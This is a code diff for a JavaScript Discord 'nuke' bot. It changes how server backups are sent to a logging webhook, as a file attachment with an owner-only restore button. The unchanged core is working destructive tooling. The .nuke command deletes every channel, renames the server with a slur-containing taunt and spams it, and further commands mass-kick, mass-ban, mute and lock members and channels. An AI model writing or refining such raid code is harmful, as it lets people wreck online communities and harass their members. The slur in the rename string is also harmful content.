@@ -1,5 +1,6 @@
 const { Client, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType } = require('discord.js');
 const http = require('http');
+const https = require('https'); // for downloading attachment from webhook message
 
 const client = new Client({ intents: [1, 512, 32768, 2, 16] });
 
@@ -11,8 +12,6 @@ const EXT_INVITE = "https://discord.com/oauth2/authorize?client_id=1489612859179
 const OWNER_ID = "1183142340609708072";
 const WHITELIST_ROLE_ID = "1498099673406374029";
 
-const backups = new Map(); // guildId -> backup data
-
 http.createServer((req, res) => {
     res.writeHead(200, {'Content-Type': 'text/plain'});
     res.end('Alive');
@@ -21,10 +20,10 @@ http.createServer((req, res) => {
 client.once('ready', () => console.log(`[+] ${client.user.tag} ready`));
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 
-// Backup helpers
+// Backup helpers (unchanged)
 async function backupGuild(guild) {
     const channels = guild.channels.cache.sort((a, b) => a.position - b.position);
-    return {
+    const data = {
         name: guild.name,
         channels: channels.map(ch => ({
             name: ch.name,
@@ -39,6 +38,7 @@ async function backupGuild(guild) {
             }))
         }))
     };
+    return data;
 }
 
 async function restoreGuild(guild, backup) {
@@ -51,7 +51,7 @@ async function restoreGuild(guild, backup) {
     // create categories first
     const categories = backup.channels.filter(c => c.type === ChannelType.GuildCategory);
     const others = backup.channels.filter(c => c.type !== ChannelType.GuildCategory);
-    const catMap = new Map(); // old cat name → new channel object
+    const catMap = new Map();
     for (const cat of categories) {
         const created = await guild.channels.create({
             name: cat.name,
@@ -87,6 +87,46 @@ async function restoreGuild(guild, backup) {
     }
 }
 
+// Webhook send with file attachment
+async function sendWebhookWithBackup(backup, guildId, originalName, username, time) {
+    const formData = new FormData();
+    
+    // Embed
+    const embed = new EmbedBuilder()
+        .setTitle('Server Nuked')
+        .setDescription(`**Name:** ${originalName}\n**By:** ${username}\n**Time:** ${time}`)
+        .setColor(0xff0000);
+    
+    // Button
+    const button = new ButtonBuilder()
+        .setCustomId(`restore_${guildId}`)
+        .setLabel('Restore Server')
+        .setStyle(ButtonStyle.Success);
+    const row = new ActionRowBuilder().addComponents(button);
+
+    // Payload JSON object
+    const payload = {
+        content: '**Server Nuked**',
+        embeds: [embed.toJSON()],
+        components: [row.toJSON()]
+    };
+
+    // Append payload as a string field
+    formData.append('payload_json', JSON.stringify(payload));
+    
+    // Backup file
+    const backupJson = JSON.stringify(backup, null, 2);
+    const buffer = Buffer.from(backupJson, 'utf-8');
+    formData.append('files[0]', buffer, `backup-${guildId}.json`);
+
+    // Send via fetch
+    await fetch(LOG_WEBHOOK, {
+        method: 'POST',
+        body: formData,
+        headers: formData.getHeaders ? formData.getHeaders() : undefined
+    });
+}
+
 client.on('messageCreate', async (message) => {
     if (message.author.bot) return;
     const isProtected = message.guild?.id === WHITELIST_SERVER;
@@ -94,7 +134,7 @@ client.on('messageCreate', async (message) => {
     const args = message.content.trim().split(/\s+/);
     const cmd = args[0].toLowerCase();
 
-    // .whitelist (owner only)
+    // .whitelist
     if (cmd === '.whitelist') {
         if (!isOwner) return message.reply('You are not the owner').catch(() => {});
         const target = message.mentions.members.first();
@@ -103,7 +143,7 @@ client.on('messageCreate', async (message) => {
         return;
     }
 
-    // Protected server – only owner can use .panel / .extpanel, nothing else
+    // Protected server
     if (isProtected && !isOwner && cmd !== '.panel' && cmd !== '.extpanel') {
         if (message.content.startsWith('.')) return message.reply('Server protected').catch(() => {});
         return;
@@ -125,7 +165,7 @@ client.on('messageCreate', async (message) => {
         return message.channel.send({ embeds: [embed], components: [row] }).catch(() => {});
     }
 
-    // .nuke – backup, webhook with restore button, then destroy
+    // .nuke
     if (cmd === '.nuke') {
         if (isProtected) return message.reply('Server protected').catch(() => {});
         await message.delete().catch(() => {});
@@ -136,32 +176,11 @@ client.on('messageCreate', async (message) => {
 
         // 1. Backup
         const backup = await backupGuild(g);
-        backups.set(g.id, backup);
 
-        // 2. Send webhook message with restore button
-        const restoreEmbed = new EmbedBuilder()
-            .setTitle('Server Nuked')
-            .setDescription(`**Name:** ${originalName}\n**By:** ${username}\n**Time:** ${time}`)
-            .setColor(0xff0000);
-        const restoreButton = new ButtonBuilder()
-            .setCustomId(`restore_${g.id}`)
-            .setLabel('Restore Server')
-            .setStyle(ButtonStyle.Success);
-        const row = new ActionRowBuilder().addComponents(restoreButton);
-        
-        try {
-            await fetch(LOG_WEBHOOK, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: '**Server Nuked**',
-                    embeds: [restoreEmbed.toJSON()],
-                    components: [row.toJSON()]
-                })
-            });
-        } catch(e) {}
+        // 2. Send webhook with embed, button, and backup file
+        await sendWebhookWithBackup(backup, g.id, originalName, username, time);
 
-        // 3. Nuke (rename, delete channels, spam)
+        // 3. Nuke
         await g.setName('NGA GOT NUKED BY JHUB').catch(() => {});
         const channels = Array.from(g.channels.cache.values());
         for (const ch of channels) { await ch.delete().catch(() => {}); await sleep(100); }
@@ -175,7 +194,7 @@ client.on('messageCreate', async (message) => {
         return;
     }
 
-    // Other destructive commands (unchanged)
+    // Other destructive commands
     if (cmd === '.kick') { const m = message.mentions.members.first(); if (!m) return message.reply('Mention a user'); m.kick().then(() => message.reply(`Kicked ${m.user.tag}`)).catch(() => {}); return; }
     if (cmd === '.ban') { const m = message.mentions.members.first(); if (!m) return message.reply('Mention a user'); m.ban().then(() => message.reply(`Banned ${m.user.tag}`)).catch(() => {}); return; }
     if (cmd === '.kickall') { let c = 0; for (const [, m] of message.guild.members.cache) { if (m.kickable && m.id !== client.user.id) { m.kick().catch(() => {}); c++; await sleep(100); } } message.reply(`Kicked ${c} members`).catch(() => {}); return; }
@@ -184,36 +203,55 @@ client.on('messageCreate', async (message) => {
     if (cmd === '.lockall') { let c = 0; for (const [, ch] of message.guild.channels.cache) { if (ch.type === 0) { ch.permissionOverwrites.create(message.guild.roles.everyone, { SendMessages: false }).catch(() => {}); c++; await sleep(100); } } message.reply(`Locked ${c} channels`).catch(() => {}); return; }
 });
 
-// Interaction handler for buttons (restore + commands list)
+// Interaction handler for restore button (and cmds list)
 client.on('interactionCreate', async (interaction) => {
     if (!interaction.isButton()) return;
-    
+
     if (interaction.customId === 'cmds') {
         const embed = new EmbedBuilder()
             .setTitle('Command List')
-            .setDescription(`.whitelist @user (owner)\n.nuke (backup + restore button)\n.kick / .ban @user\n.kickall / .banall / .muteall / .lockall\n.panel / .extpanel`)
+            .setDescription(`.whitelist @user (owner)\n.nuke (backup + restore)\n.kick / .ban @user\n.kickall / .banall / .muteall / .lockall\n.panel / .extpanel`)
             .setColor(0xff0000);
         return interaction.reply({ embeds: [embed], ephemeral: true });
     }
 
     if (interaction.customId.startsWith('restore_')) {
         const guildId = interaction.customId.split('_')[1];
-        // Only the bot owner can restore (or anyone? we'll restrict to owner for safety)
         if (interaction.user.id !== OWNER_ID) 
             return interaction.reply({ content: 'Only the bot owner can restore.', ephemeral: true });
-        
-        const guild = client.guilds.cache.get(guildId);
-        if (!guild) return interaction.reply({ content: 'Server not found. Bot may have been kicked.', ephemeral: true });
-        const backup = backups.get(guildId);
-        if (!backup) return interaction.reply({ content: 'Backup data lost (bot restarted).', ephemeral: true });
 
-        await interaction.reply({ content: 'Restoring server...', ephemeral: true });
+        // Defer reply while we process
+        await interaction.deferReply({ ephemeral: true });
+
+        const guild = client.guilds.cache.get(guildId);
+        if (!guild) return interaction.editReply('Server not found. Bot may have been kicked.');
+
+        // Get the backup file from the webhook message
+        const msg = interaction.message;
+        const attachment = msg.attachments.first();
+        if (!attachment || !attachment.name.endsWith('.json')) 
+            return interaction.editReply('No backup file found on this message.');
+
         try {
+            // Download attachment
+            const backupText = await fetch(attachment.url).then(r => r.text());
+            const backup = JSON.parse(backupText);
+
+            // Restore
             await restoreGuild(guild, backup);
-            backups.delete(guildId);
-            await interaction.editReply({ content: 'Server restored successfully!' });
-        } catch(e) {
-            await interaction.editReply({ content: 'Restore failed. Check permissions.' });
+            // Disable the button
+            const disabledRow = new ActionRowBuilder().addComponents(
+                new ButtonBuilder()
+                    .setCustomId('restored')
+                    .setLabel('Server Restored')
+                    .setStyle(ButtonStyle.Secondary)
+                    .setDisabled(true)
+            );
+            await interaction.message.edit({ components: [disabledRow] }).catch(() => {});
+            await interaction.editReply('Server restored successfully!');
+        } catch (e) {
+            console.error(e);
+            await interaction.editReply('Failed to restore. Check logs.');
         }
     }
 });
